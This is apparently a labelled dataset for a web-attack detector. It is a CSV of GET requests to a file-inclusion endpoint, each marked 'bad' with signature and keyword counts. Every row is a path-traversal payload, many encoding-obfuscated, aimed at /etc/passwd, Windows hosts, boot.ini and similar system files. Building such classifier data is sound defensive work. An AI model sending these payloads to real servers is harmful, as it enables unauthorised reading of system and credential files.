method,path,body,sign1,sign2,sign3,sign4,sign5,sign6,badwords,class
GET,/vulnerabilities/fi/?page=??Áœ??Áœ??ÁœwindowsÁœsystem32ÁœdriversÁœetcÁœhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^ÁœÀ^À^ÁœwindowsÁœsystem32ÁœdriversÁœetcÁœhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®ø€€€¯ø€€€®ø€€€®ø€€€¯ø€€€®ø€€€®ø€€€¯etcø€€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.%2%f?.%2%f?.%2%f?.%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®à€¯à€®à€®à€¯à€®à€®à€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eø€€€¯windowsø€€€¯system32ø€€€¯driversø€€€¯etcø€€€¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®\à€®à€®\à€®à€®\à€®à€®\etc\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/À®À®À¯À®À®À¯À®À®À¯À®À®À¯,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,,4,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?%u2215.?%u2215.?%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\\\..\..\..\..\..\etc\\\passwd,,0,5,4,2,0,0,2,bad
GET,/vulnerabilities/fi/?page=/....\....\....\....\....\....\....\{FILE},,0,7,6,6,7,0,0,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÀ¯%c0%ae%c0%aeÀ¯%c0%ae%c0%aeÀ¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts,,1,0,0,0,0,1,2,bad
GET,/vulnerabilities/fi/?page=..../%2%f..../%2%f..../%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,3,0,0,0,0,3,1,bad
GET,/vulnerabilities/fi/?page=\..Á\..Á\..Á\..Á\..ÁwindowsÁsystem32ÁdriversÁetcÁhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ü€€€€®ü€€€€®%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%uEFC8ÀîÀî%uEFC8etc%uEFC8passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=??Áœ??Áœ??Áœ??Áœ??Áœ??ÁœetcÁœissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®%c1%9cø€€€®ø€€€®%c1%9cø€€€®ø€€€®%c1%9cø€€€®ø€€€®%c1%9cetc%c1%9cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2eÁ%2e%2eÁ%2e%2eÁwindowsÁsystem32ÁdriversÁetcÁhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../\../\../\etc/\issue,,3,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.%2f.../.%2f.../.%2f.../.%2fboot.ini,,4,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..//etc/passwd,,1,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/proc/cmdline,,0,0,0,0,0,0,3,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®%u2216ð€€®ð€€®%u2216ð€€®ð€€®%u2216ð€€®ð€€®%u2216ð€€®ð€€®%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%2%fÀþÀþ%2%fÀþÀþ%2%fÀþÀþ%2%fÀþÀþ%2%fÀþÀþ%2%fetc%2%fissue,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/var/log/error.log,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae0x2f%c0%ae%c0%ae0x2f%c0%ae%c0%ae0x2f%c0%ae%c0%ae0x2f%c0%ae%c0%ae0x2f%c0%ae%c0%ae0x2fetc0x2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.À/.../.À/.../.À/.../.À/boot.ini,,4,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%5cÀîÀî%5cÀîÀî%5cÀîÀî%5cÀîÀî%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%u2216ÀþÀþ%u2216ÀþÀþ%u2216ÀþÀþ%u2216ÀþÀþ%u2216etc%u2216passwd,,0,0,0,0,0,0,2,bad
